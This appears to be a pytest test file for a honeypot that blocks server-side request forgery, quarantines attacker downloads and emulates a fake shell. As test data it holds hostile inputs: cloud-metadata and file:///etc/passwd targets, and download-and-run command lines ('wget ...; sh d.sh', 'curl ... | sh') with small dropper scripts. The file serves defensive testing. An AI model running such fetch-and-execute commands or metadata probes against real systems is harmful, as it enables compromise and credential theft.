from __future__ import annotations

import asyncio
import hashlib

import pytest

from honeynet import fetcher as F
from honeynet.services.fetcher_client import FetcherClient
from honeynet.shell.session import ShellSession
from conftest import FakeCtx, free_port, read_events


@pytest.mark.parametrize("host", ["127.0.0.1", "10.0.0.5", "192.168.1.1", "169.254.169.254", "172.16.0.9",
                                  "::1", "0.0.0.0", "100.64.0.1", "224.0.0.1", "::ffff:127.0.0.1", "fe80::1"])
async def test_ssrf_guard_blocks_non_public(host):
    with pytest.raises(F.FetchError):
        await F.resolve_public(host)


async def test_ssrf_guard_allows_public_literal():
    assert await F.resolve_public("8.8.8.8") == ["8.8.8.8"]


def test_validate_url_rules():
    assert F.validate_url("http://example.com/a.sh?x=1")[1:] == ("example.com", 80, "/a.sh?x=1")
    for bad in ("file:///etc/passwd", "gopher://x/", "ftp://x/y", "http:///nohost", "http://x:25/", "http://x:445/",
                "http://x/" + "a" * 3000):
        with pytest.raises(F.FetchError):
            F.validate_url(bad)


async def _serve_payload(body: bytes, status=200):
    async def handle(r, w):
        await r.readuntil(b"\r\n\r\n")
        w.write(f"HTTP/1.0 {status} OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {len(body)}\r\n\r\n".encode() + body)
        await w.drain()
        w.close()
    port = free_port()
    srv = await asyncio.start_server(handle, "127.0.0.1", port)
    return srv, port


async def test_fetch_into_quarantine_and_api_roundtrip(settings, monkeypatch):
    monkeypatch.setattr(F, "is_forbidden_ip", lambda ip: False)      # allow loopback for the test server only
    settings.fetcher_token = "tok-123456"
    payload = b"#!/bin/sh\necho pwned\nuname -m\n"
    srv, port = await _serve_payload(payload)
    f = F.Fetcher(settings)
    api_port = free_port()
    api = await asyncio.start_server(lambda r, w: F._handle(f, settings.fetcher_token, r, w), "127.0.0.1", api_port)
    try:
        client = FetcherClient(f"http://127.0.0.1:{api_port}", "tok-123456")
        res = await client.fetch(f"http://127.0.0.1:{port}/x.sh", src_ip="192.0.2.50", session="s1", service="ssh")
        assert res.ok and res.sha256 == hashlib.sha256(payload).hexdigest() and res.body == payload and res.body_complete
        assert (settings.quarantine_dir / res.sha256[:2] / res.sha256).read_bytes() == payload
        bad = await FetcherClient(f"http://127.0.0.1:{api_port}", "wrong-token").fetch(
            f"http://127.0.0.1:{port}/x.sh", src_ip="192.0.2.50", session="s1", service="ssh")
        assert not bad.ok
    finally:
        srv.close(); api.close()
    ev = [e for e in read_events(settings, "fetcher") if e["event"] == "file.captured"]
    assert ev and ev[0]["src_ip"] == "192.0.2.50" and ev[0]["session"] == "s1" and ev[0]["data"]["origin"] == "download"


async def test_fetcher_refuses_private_targets_and_errors_are_clean(settings):
    f = F.Fetcher(settings)
    r = await f.fetch({"url": "http://127.0.0.1:1/x", "src_ip": "192.0.2.1"})
    assert r == {"ok": False, "error": "ssrf:non-public-address"}
    r = await f.fetch({"url": "http://169.254.169.254/latest/meta-data/", "src_ip": "192.0.2.1"})
    assert not r["ok"]
    r = await f.fetch({"url": "file:///etc/passwd", "src_ip": "192.0.2.1"})
    assert r["error"] == "scheme-not-allowed"


async def test_fetch_rate_limit_per_ip(settings):
    f = F.Fetcher(settings)
    results = [await f.fetch({"url": f"http://127.0.0.1:1/{i}", "src_ip": "192.0.2.77"}) for i in range(25)]
    assert any(r.get("error") == "ip-rate-limit" for r in results)


async def test_shell_wget_uses_fetcher_and_runs_script_inside_fake_shell(settings, monkeypatch):
    monkeypatch.setattr(F, "is_forbidden_ip", lambda ip: False)
    settings.fetcher_token = "tok-abcdef"
    payload = b"#!/bin/sh\necho DROPPER-RAN\ncd /tmp && wget http://127.0.0.1:1/second-stage\n"
    srv, port = await _serve_payload(payload)
    f = F.Fetcher(settings)
    api_port = free_port()
    api = await asyncio.start_server(lambda r, w: F._handle(f, settings.fetcher_token, r, w), "127.0.0.1", api_port)
    try:
        ctx = FakeCtx()
        ctx.fetcher = FetcherClient(f"http://127.0.0.1:{api_port}", "tok-abcdef")
        events = []
        sh = ShellSession(persona_name="debian", user="root", emit=lambda e, **d: events.append((e, d)), ctx=ctx,
                          src_ip="192.0.2.9", session_id="s9", service="ssh")
        r = await sh.feed(f"cd /tmp; wget -q http://127.0.0.1:{port}/d.sh; chmod +x d.sh; sh d.sh", final=True)
        assert b"DROPPER-RAN" in r.output
        dl = [d for e, d in events if e == "download.attempt"]
        assert dl[0]["fetched"] is True and dl[0]["sha256"] == hashlib.sha256(payload).hexdigest()
        assert len(dl) == 2 and dl[1]["fetched"] is False         # second stage: 127.0.0.1 refused? (port 1 closed)
    finally:
        srv.close(); api.close()


async def test_fetcher_disabled_by_default_shell_only_simulates(settings):
    ctx = FakeCtx()      # fetcher=None  -> no outbound code path at all
    events = []
    sh = ShellSession(persona_name="debian", user="root", emit=lambda e, **d: events.append((e, d)), ctx=ctx,
                      src_ip="192.0.2.9", session_id="s9", service="ssh")
    await sh.feed("wget http://203.0.113.1/a; curl -s http://203.0.113.1/b | sh", final=True)
    assert [d["fetched"] for e, d in events if e == "download.attempt"] == [False, False]
